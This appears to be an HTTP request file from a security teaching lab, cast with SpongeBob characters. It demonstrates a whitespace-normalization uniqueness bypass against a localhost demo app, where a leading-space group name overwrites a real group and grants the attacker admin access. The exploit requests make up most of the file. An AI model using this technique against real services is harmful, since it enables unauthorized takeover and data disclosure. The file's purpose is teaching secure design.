@base = http://localhost:8000/ii/normalization-canonicalization/example4

### First, Plankton confirms he cannot access the Krusty Krab group
GET {{base}}/groups/staff@krusty-krab.sea/messages
Authorization: Basic plankton@chum-bucket.sea:burgers-are-yummy

# Results in 403 Forbidden:
# Forbidden: not a member of the requested group

###

### EXPLOIT: Plankton uses "create group" with LEADING whitespace: " staff@krusty-krab.sea"
### This passes the uniqueness check (looks different), but strips to the real group name during save
POST {{base}}/groups/new
Authorization: Basic plankton@chum-bucket.sea:burgers-are-yummy
Content-Type: application/json

{
    "name": " staff@krusty-krab.sea",
    "users": [
        { "role": "member", "user": "spongebob@krusty-krab.sea" },
        { "role": "member", "user": "squidward@krusty-krab.sea" },
        { "role": "admin", "user": "mr.krabs@krusty-krab.sea" },
        { "role": "admin", "user": "plankton@chum-bucket.sea"}
    ],
    "messages": []
}

###

### Plankton now accesses the REAL Krusty Krab group (no leading space) as admin
GET {{base}}/groups/staff@krusty-krab.sea/messages
Authorization: Basic plankton@chum-bucket.sea:burgers-are-yummy

# Results in sensitive data disclosure:
#
# [
#   {
#     "from": "mr.krabs@krusty-krab.sea",
#     "message": "I am updating the safe password to '123456'. Do not tell anyone!"
#   }
# ]
#
# IMPACT: Plankton achieved complete group takeover! The uniqueness check sees
# " staff@krusty-krab.sea" (with leading space) as different from the existing
# "staff@krusty-krab.sea" group. But whitespace stripping during database save
# causes an UPSERT that overwrites Mr. Krabs' group with Plankton as admin.
# Now Plankton has full admin privilegesâ€”he can read messages, post as anyone,
# and control all group operations. This is privilege escalation through
# normalization-based uniqueness bypass.
